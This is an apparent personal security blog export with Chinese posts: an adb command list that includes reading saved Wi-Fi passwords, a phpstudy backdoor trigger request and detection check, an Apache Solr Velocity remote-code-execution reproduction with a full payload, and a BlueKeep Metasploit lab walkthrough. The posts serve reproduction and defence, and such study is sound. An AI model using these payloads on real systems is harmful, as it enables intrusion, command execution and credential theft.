<li>cat &#x2F;data&#x2F;misc&#x2F;wifi&#x2F;*.conf &#x2F;&#x2F;æŸ¥çœ‹è¿æ¥è¿‡çš„wifiå¯†ç </li>
<li>adb shell input keyevent <keycode><br>  keycode    å«ä¹‰<br>  3    HOME é”®<br>  4    è¿”å›é”®<br>  5    æ‰“å¼€æ‹¨å·åº”ç”¨<br>  6    æŒ‚æ–­ç”µè¯<br>  24    å¢åŠ éŸ³é‡<br>  25    é™ä½éŸ³é‡<br>  26    ç”µæºé”®<br>  27    æ‹ç…§ï¼ˆéœ€è¦åœ¨ç›¸æœºåº”ç”¨é‡Œï¼‰<br>  64    æ‰“å¼€æµè§ˆå™¨<br>  82    èœå•é”®<br>  85    æ’­æ”¾&#x2F;æš‚åœ<br>  86    åœæ­¢æ’­æ”¾<br>  87    æ’­æ”¾ä¸‹ä¸€é¦–<br>  88    æ’­æ”¾ä¸Šä¸€é¦–<br>  122    ç§»åŠ¨å…‰æ ‡åˆ°è¡Œé¦–æˆ–åˆ—è¡¨é¡¶éƒ¨<br>  123    ç§»åŠ¨å…‰æ ‡åˆ°è¡Œæœ«æˆ–åˆ—è¡¨åº•éƒ¨<br>  126    æ¢å¤æ’­æ”¾<br>  127    æš‚åœæ’­æ”¾<br>  164    é™éŸ³<br>  176    æ‰“å¼€ç³»ç»Ÿè®¾ç½®<br>  187    åˆ‡æ¢åº”ç”¨<br>  207    æ‰“å¼€è”ç³»äºº<br>  208    æ‰“å¼€æ—¥å†<br>  209    æ‰“å¼€éŸ³ä¹<br>  210    æ‰“å¼€è®¡ç®—å™¨<br>  220    é™ä½å±å¹•äº®åº¦<br>  221    æé«˜å±å¹•äº®åº¦<br>  223    ç³»ç»Ÿä¼‘çœ <br>  224    ç‚¹äº®å±å¹•<br>  231    æ‰“å¼€è¯­éŸ³åŠ©æ‰‹<br>  276    å¦‚æœæ²¡æœ‰ wakelock åˆ™è®©ç³»ç»Ÿä¼‘çœ </li>
</ul>
<p>åˆ·æœºç›¸å…³å‘½ä»¤ï¼š<br>adb reboot recovery   &#x2F;&#x2F;é‡å¯åˆ° Recovery æ¨¡å¼<br>adb reboot                 &#x2F;&#x2F;ä» Recovery é‡å¯åˆ° Android<br>adb reboot bootloader  &#x2F;&#x2F;é‡å¯åˆ° Fastboot æ¨¡å¼</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å…¶å®adbè¿˜æœ‰å¾ˆå¤šå§¿åŠ¿ï¼Œæˆ‘ä»‹ç»çš„å¯èƒ½åªæ˜¯å†°å±±ä¸€è§’å§ã€‚ä½†æ˜¯è¿™äº›å¯¹äºæˆ‘æ¥è¯´å·²ç»å¤Ÿç”¨äº†ï¼Œè€Œä¸”è¿œè¿œæ»¡è¶³æˆ‘çš„å·¥ä½œéœ€æ±‚ï¼Œæ‰€ä»¥ä½ å¦‚æœå’Œæˆ‘ä¸€æ ·åªæ˜¯åšäº›æµ‹è¯•å·¥ä½œï¼Œé‚£ä¹ˆè¿™äº›ä¸œè¥¿å·®ä¸å¤šå¤Ÿç”¨ï¼Œå¦‚æœä½ æƒ³æŠŠå®ƒå½“ç©å…·ï¼Œæœ€å¥½è¿˜æ˜¯å»é˜…è¯»ä¸‹å®˜æ–¹æ–‡æ¡£å§ã€‚</p>
]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>adb</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudyåé—¨äº‹ä»¶</title>
    <url>//posts/phpstudy%E5%90%8E%E9%97%A8%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="phpstudyåé—¨äº‹ä»¶-gt-æˆ‘çš„è™šæ‹Ÿæœºä¸­æ‹›äº†-ğŸ˜‚"><a href="#phpstudyåé—¨äº‹ä»¶-gt-æˆ‘çš„è™šæ‹Ÿæœºä¸­æ‹›äº†-ğŸ˜‚" class="headerlink" title="phpstudyåé—¨äº‹ä»¶   -&gt;  æˆ‘çš„è™šæ‹Ÿæœºä¸­æ‹›äº† ğŸ˜‚"></a>phpstudyåé—¨äº‹ä»¶   -&gt;  æˆ‘çš„è™šæ‹Ÿæœºä¸­æ‹›äº† ğŸ˜‚</h2><p>æœ€è¿‘ï¼Œphpstudy åé—¨äº‹ä»¶æå¾—é£é£ç«ç«çš„ï¼Œç„¶åæˆ‘æ£€æŸ¥äº†è‡ªå·±çš„ç¬”è®°æœ¬ï¼Œå‘ç°æ²¡æœ‰ä¸­æ‹›ï¼Œæœ¬æ¥è¿˜é«˜å…´äºè‡ªå·±çš„å®‰å…¨æ„è¯†ï¼Œå› ä¸ºæˆ‘ä¸‹è½½è½¯ä»¶åŸºæœ¬ä»å®˜ç½‘ä¸‹è½½ã€‚ç»“æœå½“æˆ‘æ‰“å¼€æˆ‘çš„è™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œå‘ç°è¿™ä¸ªç‰ˆæœ¬å’Œæˆ‘è‡ªå·±ç”¨çš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œäºæ˜¯æˆ‘æµ‹è¯•äº†ä¸€ä¸‹ï¼Œdownï¼Œåé—¨å­˜åœ¨ã€‚è™šæ‹Ÿæœºä¸Šä¹Ÿæ”¾äº†ä¸€ä¸¢ä¸¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œè¿™æ¬¡çœŸçš„æ˜¯æœ‰ç‚¹å°´å°¬äº†ï¼Œèµ¶ç´§åˆ é™¤å¯¹åº”ç‰ˆæœ¬ã€‚ä¸ç»™æˆ‘å¹³å¸¸ç”¨çš„éƒ½æ˜¯7.0ï¼Œæ‰€ä»¥é—®é¢˜ä¹Ÿä¸ç®—å¤ªå¤§ã€‚çœ‹æ¥ä»¥åä¸‹è½½ä¸œè¥¿çœŸçš„è¦ä¸¥æ ¼æŠŠå…³äº†ã€‚è™šæ‹Ÿæœºä¸Šçš„è¿™ä¸ªæˆ‘è§‰å¾—æ˜¯è™šæ‹Ÿæœºå°±éšä¾¿æäº†ä¸€ä¸ªè¿›å»ï¼Œç»“æœå°±ä¸­æ‹›äº†ã€‚</p>
<span id="more"></span>

<h2 id="æ¼æ´èŒƒå›´"><a href="#æ¼æ´èŒƒå›´" class="headerlink" title="æ¼æ´èŒƒå›´"></a>æ¼æ´èŒƒå›´</h2><p>phpstudy2016-2018ï¼Œphp5.4.45 æ–‡ä»¶å¤¹ä¸‹çš„ php_xmlrpc.dll ï¼ˆæˆ‘è¿™é‡Œçš„è¿˜æœ‰php5.4.45 nts è¿™ä¸ªæ–‡ä»¶ä¸‹çš„php_xmlrpc.dllæ˜¯æ²¡æœ‰åé—¨çš„ï¼‰ï¼Œå¦å¤–ç½‘ä¸Šéƒ½æ˜¯è¯´åªæœ‰php5.4.45ï¼Œç»“æœæˆ‘çš„è™šæ‹Ÿæœºä¸Šçš„2018è¿˜å‘ç°5.2.17ä¹Ÿå­˜åœ¨ã€‚æ‰€ä»¥å¤§å®¶æœ€å¥½æ£€æŸ¥æ¯ä¸ªç‰ˆæœ¬çš„phpé‡Œé¢çš„php_xmlrpc.dll æ–‡ä»¶<br>payloadï¼š</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /flag.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.37.10</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64; rv:<span class="number">55</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">55</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,en-US;q=<span class="number">0</span>.<span class="number">5</span>,en;q=<span class="number">0</span>.<span class="number">3</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">accept</span>-charset: ZWNobyBzeXN0ZW0oIndob2FtaSIpOw==</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip,deflate</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>å› ä¸ºæ˜¯åŠ è½½çš„dllï¼Œæ‰€ä»¥è¿™é‡Œéšæ„è¯·æ±‚ä¸ªphpæ–‡ä»¶éƒ½å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥è¿˜æ˜¯å¾ˆçŒ›çš„ã€‚</p>
<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æˆ‘è¿™é‡Œæ˜¯phpstudy2018 æ‰“å¼€ phpstudy2018\PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll<br>æ‹–å…¥IDA å­—ç¬¦ä¸²è§†å›¾ ç›´æ¥æœç´¢evalå³å¯çœ‹åˆ°åé—¨</p>
<p><img data-src="/images/1569296573066.png" alt="1569296573066"></p>
<p>å¦‚æœä½ æ²¡æœ‰IDAä¹Ÿå¾ˆç®€å•ï¼Œéšä¾¿æ‰¾ä¸ªèƒ½çœ‹å­—ç¬¦ä¸²çš„æ‰“å¼€å¯¹åº” php_xmlrpc.dll æœç´¢evalï¼Œæ¯”å¦‚linuxï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings php_xmlrpc.dll | grep <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å›æ˜¾ï¼š</span></span><br><span class="line">zend_eval_string</span><br><span class="line">@<span class="built_in">eval</span>(%s(<span class="string">&#x27;%s&#x27;</span>));</span><br><span class="line">%s;@<span class="built_in">eval</span>(%s(<span class="string">&#x27;%s&#x27;</span>));</span><br></pre></td></tr></table></figure>
<h2 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h2><p>è¿˜æƒ³æ¥ç€ç”¨å°±ç›´æ¥åˆ é™¤ php_xmlrpc.dll  å½“ç„¶æœ€å¥½æ˜¯å»å®˜ç½‘ä¸‹è½½æ²¡æœ‰åé—¨çš„phpstudyã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>åé—¨</tag>
        <tag>php-study</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache solr RCEï¼ˆCVE-2019-xxxxï¼‰</title>
    <url>//posts/Apache_solr_RCE/</url>
    <content><![CDATA[<p>&amp;#160; &amp;#160; &amp;#160; è®°å½•ä¸€ä¸‹å¤ç°è¿‡ç¨‹ï¼Œé˜²æ­¢ä¸‹æ¬¡é‡è§çš„æ—¶å€™å†å»ç¿»èµ„æ–™ï¼Œ é¦–å…ˆ Apache Solræ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ä¼ä¸šçº§æœç´¢åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒå¯¹å¤–æä¾›ç±»ä¼¼äºWeb-serviceçš„APIæ¥å£ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡httpè¯·æ±‚ï¼Œå‘æœç´¢å¼•æ“æœåŠ¡å™¨æäº¤ä¸€å®šæ ¼å¼çš„XMLæ–‡ä»¶ï¼Œç”Ÿæˆç´¢å¼•ï¼›ä¹Ÿå¯ä»¥é€šè¿‡Http Getæ“ä½œæå‡ºæŸ¥æ‰¾è¯·æ±‚ï¼Œå¹¶å¾—åˆ°XMLæ ¼å¼çš„è¿”å›ç»“æœã€‚ Apache solrå†å²ä¸Šæœ‰ä¼—å¤šé«˜å±æ¼æ´ï¼Œä¸ºäº†è‡ªå·±ä»¥åé‡è§ç›´æ¥æ‰¾åˆ°æ‰€æœ‰æ¼æ´å¤ç°æ–¹å¼ï¼Œå…ˆè´´ä¸ªé“¾æ¥ï¼š <a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt ">apache solrå†å²æ¼æ´åˆ—è¡¨</a></p>
<span id="more"></span>

<h3 id="å¤ç°å†ç¨‹"><a href="#å¤ç°å†ç¨‹" class="headerlink" title="å¤ç°å†ç¨‹"></a>å¤ç°å†ç¨‹</h3><p>1ã€ç‚¹å‡»core admin æŸ¥çœ‹éƒ¨ç½²çš„åº”ç”¨çš„è·¯å¾„ ï¼ˆä¸‹å›¾åº”ç”¨åå°±æ˜¯dovecotï¼‰<br><img data-src="/images/pages/1572506935286.png" alt="1572506935286"></p>
<p>2ã€POST ä¸‹é¢æ›´æ”¹configçš„xml åˆ° &#x2F;solr&#x2F;åº”ç”¨å&#x2F;configï¼ˆæ¯”å¦‚ï¼š&#x2F;solr&#x2F;dovecot&#x2F;configï¼‰</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>3ã€è¯·æ±‚ POC(æ³¨æ„ç¼–ç é—®é¢˜ï¼Œå’Œç©ºæ ¼é—®é¢˜)</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">GET /solr/master_babyartikel_Product_flop/select?q=<span class="number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="meta">%23set</span>(<span class="variable">$x</span>=<span class="meta">%27</span><span class="meta">%27</span>)+<span class="meta">%23set</span>(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Runtime<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Character<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.String<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().exec(<span class="string">&#x27;id&#x27;</span>))+<span class="variable">$ex</span>.waitFor()+<span class="meta">%23set</span>(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+<span class="meta">%23foreach</span>(<span class="variable">$i</span>+<span class="keyword">in</span>+[<span class="number">1</span>..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.read()))<span class="meta">%23end</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/1572507215924.png" alt="1572507215924"></p>
<p>ç›®å‰æµ‹è¯•äº† 7.1 7.4 8.1 éƒ½å¯æˆåŠŸæ‰§è¡Œä»£ç ã€‚</p>
<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p><strong>æ³¨æ„ï¼š</strong>1ã€å¦‚æœç¬¬äºŒæ­¥ä¿®æ”¹configå“åº”403åˆ™æ²¡æƒé™ä¿®ï¼Œæ­¤æ—¶å¦‚æœçŸ¥é“è´¦å·å¯†ç å¯è¿›ä¸€æ­¥æ“ä½œï¼Œå¦‚æœä¸çŸ¥é“ï¼Œå»ºè®®æ”¾å¼ƒ-å“ˆå“ˆã€‚<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160; &amp;#160; 2ã€å¦‚æœå“åº”500å¯èƒ½å­˜åœ¨çš„æƒ…å†µå°±æ˜¯ä½ çš„åŒ…å‡ºç°äº†é—®é¢˜ï¼Œå†æ¬¡æ£€æŸ¥è¯·æ±‚åŒ…æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®åˆ™å¯èƒ½æ˜¯solrçš„æœåŠ¡æŸåã€‚<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160; &amp;#160; 3ã€å¦‚æœè¿”å›200ä¹Ÿåˆ«å¤ªé«˜å…´ï¼Œçœ‹çœ‹å“åº”æœ‰æ²¡æœ‰errorã€‚æ²¡æœ‰errorå³å¯è¿›è¡Œç¬¬ä¸‰æ­¥ï¼Œå³å‘½ä»¤æ‰§è¡ŒPOCã€‚<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160; &amp;#160; 4ã€ç¬¬äºŒæ­¥æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œç¬¬ä¸‰æ­¥ç»å¤§å¤šæ•°éƒ½å¯ä»¥æˆåŠŸï¼Œä½†æ˜¯æœ‰çš„å¯èƒ½ä¼šè¿”å›xmlï¼Œ400ï¼Œç­‰ä¸€ç³»åˆ—ä¸æ­£å¸¸çš„ä¿¡æ¯ï¼Œè¿™æ—¶å€™å»çœ‹ä¸€ä¸‹config - <a href="http://x.x.x.x:8080/solr/%E5%BA%94%E7%94%A8%E5%90%8D/config">http://x.x.x.x:8080/solr/åº”ç”¨å/config</a> æŸ¥çœ‹é…ç½®æ˜¯å¦çœŸçš„è¢«ä½ åœ¨ç¬¬äºŒæ­¥æ›´æ”¹äº†ï¼ˆæœç´¢velocity çœ‹å‰åæ˜¯å¦æ˜¯ä½ POSTä¿®æ”¹çš„josnï¼‰ã€‚å¦‚æœæ²¡æœ‰åˆ™é‡åšç¬¬äºŒæ­¥ã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>apache</tag>
      </tags>
  </entry>
  <entry>
    <title>æˆ‘çš„åšå®¢å†æ¬¡ä¸Šçº¿</title>
    <url>//posts/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%86%8D%E6%AC%A1%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<pre><code>    ç¬¬ä¸€ä¸ªåšå®¢æ˜¯å¤§äºŒä¸Šå­¦æœŸæ­å»ºçš„ï¼Œé‚£æ—¶å€™æ»¡è…”çƒ­è¡€ï¼Œéš”å‡ å¤©å°±è¦æ›´æ–°ä¸€æ³¢åšå®¢ã€‚åæ¥è¶Šæ¥è¶Šå¿™ï¼Œæ›´æ–°è¶Šæ¥è¶Šå°‘ã€‚ç›´åˆ°æœ‰ä¸€å¤©æˆ‘çš„æœåŠ¡å™¨å’ŒåŸŸåéƒ½åˆ°æœŸäº†ï¼Œæˆ‘è§‰å¾—æ²¡æœ‰ç»§ç»­ä¸‹å»çš„å¿…è¦äº†ï¼Œæ‰€ä»¥åšå®¢ä¸‹çº¿ï¼Œæˆ‘çš„æ€»ç»“æ›´å¤šçš„å†™åœ¨äº†evernoteï¼ˆå°è±¡ç¬”è®°å›½é™…ç‰ˆï¼‰ä¸Šã€‚&lt;!-- more --&gt;  

    ç°åœ¨åˆšå…¥èŒcfcaï¼Œå·¥ä½œä¸ç®—ç‰¹åˆ«å¿™ï¼Œç¿»çœ‹æˆ‘çš„ç¬”è®°å‘ç°ç”±äºæ²¡æœ‰ç»™åˆ«äººçœ‹çš„éœ€æ±‚ï¼Œæ–‡ç« å†™çš„å¤ªä¹±ï¼Œæ’ç‰ˆä¹Ÿå¾ˆå·®ï¼Œç°åœ¨æˆ‘è‡ªå·±çœ‹èµ·æ¥éƒ½è´¹åŠ²ã€‚æ‰€ä»¥ï¼Œæˆ‘è§‰å¾—æ˜¯æ—¶å€™æ­å»ºä¸€ä¸ªåšå®¢æ¥ç›‘ç£æˆ‘çš„å­¦ä¹ äº†ã€‚  
    ä¹‹æ‰€ä»¥é€‰æ‹©hexoæ˜¯å› ä¸ºæˆ‘ç›®å‰å¤§å¤šæ•°æƒ…å†µä¸‹ç”¨markdownï¼Œå¦å¤–åšå®¢çš„æœ¬è´¨å°±æ˜¯åˆ†äº«å†…å®¹ï¼Œè¶Šç®€å•è¶Šå¥½ã€‚å¦å¤–ä¹Ÿä¸æƒ³ä¹°åŸŸåã€æœåŠ¡å™¨ã€‚åˆè¦ç»­è´¹åˆè¦æ—¶æ—¶ç»´æŠ¤ï¼Œå¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥å°±æ­åœ¨githubä¸Šäº†ã€‚æˆ‘ä¸æƒ³åœ¨è¿™äº›äº‹æƒ…ä¸ŠèŠ±è´¹å¤ªå¤šç²¾åŠ›ï¼Œæˆ‘åªæƒ³å¥½å¥½å­¦ä¹ ï¼Œèµšç‚¹é’±ï¼Œæ”¹å–„ç”Ÿæ´»ã€‚å˜¿å˜¿ã€‚  

    æˆ‘çš„åšå®¢æ€»ä½“æ¥è¯´å°±æ˜¯æˆ‘çš„ç¬”è®°ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯ç»™æˆ‘è‡ªå·±çœ‹çš„ï¼Œå½“ç„¶å¦‚æœæ–‡ç« æœ‰é”™è¯¯ä¹Ÿæ¬¢è¿æŒ‡æ­£ã€‚
    ç«‹ä¸ªfalgï¼Œå¸Œæœ›æˆ‘èƒ½æ¯ä¸¤å‘¨èƒ½å†™ä¸€ç¯‡æŠ€æœ¯åˆ†äº«ã€‚
</code></pre>
]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title>MS2019_0708å¤ç°ç¬”è®°</title>
    <url>//posts/MS2019_0708%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="ç¯å¢ƒä»‹ç»"><a href="#ç¯å¢ƒä»‹ç»" class="headerlink" title="ç¯å¢ƒä»‹ç»"></a>ç¯å¢ƒä»‹ç»</h2><p>windows7ï¼š<br><img data-src="/images/pages/1568125420978.png" alt="1568125420978"></p>
<p>kali2019ï¼šè¿™é‡Œå°±ä¸æˆªå›¾äº†ï¼Œå°±æ˜¯kali2019ï¼Œå› ä¸ºå¬è¯´msfçš„ç‰ˆæœ¬å¿…é¡»å¤§äº5.0ï¼Œæ‡’å¾—å‡çº§ç›´æ¥é‡è£…kali</p>
<p>å¤‡æ³¨ï¼šwindows7 ç›®å‰åªèƒ½å¤ç°æ——èˆ°ç‰ˆçš„sp1 å¦‚æœæ€»æ˜¯é‡è§è“å±è¯·æŠŠwin7è™šæ‹Ÿæœºè°ƒæˆ2G2æ ¸ã€‚å¦å¤–å®‰è£…è™šæ‹Ÿæœºçš„æ—¶å€™è®°å¾—é€‰æ‹©ultimateï¼Œå¦åˆ™è™šæ‹Ÿæœºé»˜è®¤å®‰è£…å®¶åº­ç‰ˆï¼Œè¿™ä¸ªå¾ˆé‡è¦ã€‚</p>
<span id="more"></span>
<h2 id="å…ˆæå¥½MSF"><a href="#å…ˆæå¥½MSF" class="headerlink" title="å…ˆæå¥½MSF"></a>å…ˆæå¥½MSF</h2><p>é¦–å…ˆæˆ‘ä»¬è¦ä¸‹è½½ç½‘ä¸Šçš„msf rbè„šæœ¬ï¼Œæˆ‘è¿™é‡Œæ˜¯ä»githubä¸€ä¸ªè€å“¥é‚£å„¿ä¸‹è½½çš„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure>
<p>ç½‘ä¸Šè¿˜æœ‰å¦ä¸€ä¸ªè„šæœ¬ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/backlion/demo/raw/master/CVE-2019-0708_RDP%20_MSF.zip">https://github.com/backlion/demo/raw/master/CVE-2019-0708_RDP%20_MSF.zip</a> è¿™é‡Œçš„è¿™ä¸ªæˆ‘ä¹Ÿç”¨äº†ï¼Œä½†æ˜¯ä¸€ç›´ä¸æˆåŠŸï¼Œåæ¥æˆ‘å°±å»ä¸‹è½½äº†ä¸Šé¢çš„é‚£ä¸ªã€‚ä¹Ÿå¯èƒ½æ˜¯æˆ‘æ²¡æå¥½è·¯å¾„è¦†ç›–å§ï¼Œæˆ‘è¿˜æ˜¯æ¨èç”¨æˆ‘ä¸‹è½½çš„é‚£ä¸ªã€‚  </p>
<p>ä¸‹é¢å°±æ˜¯æŠŠä¸Šé¢ä¸‹è½½çš„å››ä¸ªè„šæœ¬æ”¾è¿›msfï¼Œå¦‚æœä½ æ˜¯è‡ªå·±å®‰è£…çš„msfï¼Œä½ çš„msf åº”è¯¥åœ¨&#x2F;opt ç›®å½•ä¸‹ï¼Œå¦‚æœæ˜¯è‡ªå¸¦çš„åº”è¯¥åœ¨&#x2F;usr&#x2F;share&#x2F;<br>æˆ‘çš„æ˜¯è‡ªå¸¦çš„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">æ›¿æ¢æ–‡ä»¶ï¼š</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb Â  æ›¿æ¢ Â /usr/share/metasploit</span><br><span class="line">framework/modules/exploit/windows/rdp/</span><br><span class="line"></span><br><span class="line">rdp.rb Â  æ›¿æ¢ Â /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb æ›¿æ¢ Â /usr/share//metasploit</span><br><span class="line">framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb æ›¿æ¢ /usr/share/metasploit</span><br><span class="line">framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä½ æ˜¯è‡ªå·±ä¸‹è½½çš„ï¼ŒåŒç†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¦‚æœè¿™é‡Œæ²¡æœ‰rdpç›®å½•ï¼Œå°±åˆ›å»ºä¸€ä¸ªrdpç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/rdp/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure>
<h4 id="å¼€å§‹æ”»å‡»"><a href="#å¼€å§‹æ”»å‡»" class="headerlink" title="å¼€å§‹æ”»å‡»"></a>å¼€å§‹æ”»å‡»</h4><p>é¦–å…ˆä¿è¯èƒ½pingé€šwin7 è™šæ‹Ÿæœºï¼ˆé¶æœºï¼‰ï¼Œç„¶åå…³é—­win7çš„é˜²ç«å¢™ï¼ˆæ²¡é”™ï¼Œç›®å‰å°±æ˜¯è¿™ä¹ˆé¸¡è‚‹ï¼‰ï¼Œå¼€å¯win7çš„è¿œç¨‹æ¡Œé¢ï¼Œè¿™ä¸ªå°±ä¸ç”¨æ•™äº†å§ã€‚<br>é¶æœºï¼š192.168.26.159<br>æ”»å‡»æœºï¼š192.168.26.180<br>å¼€å¯msfconsoleï¼Œæ‰§è¡Œ reload_allã€‚<br>ç„¶å Â searchÂ cve_2019_0708_bluekeep_rce çœ‹çœ‹æ˜¯å¦è¦†ç›–è¿›å»äº†ã€‚<br>ç´§æ¥ç€ useÂ exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce åŠ è½½æ¨¡å—ï¼Œç„¶åè®¾ç½®ä¸‰ä¸ªå‚æ•°ï¼š<br>RHOSTS é¶æœºip<br>RPORT rdpç«¯å£<br>target IDæ•°å­—(å¯é€‰ä¸º0-4)è®¾ç½®å—å®³æœºæœºå™¨æ¶æ„<br>PSï¼šæˆ‘æ˜¯set target 3 æˆåŠŸçš„</p>
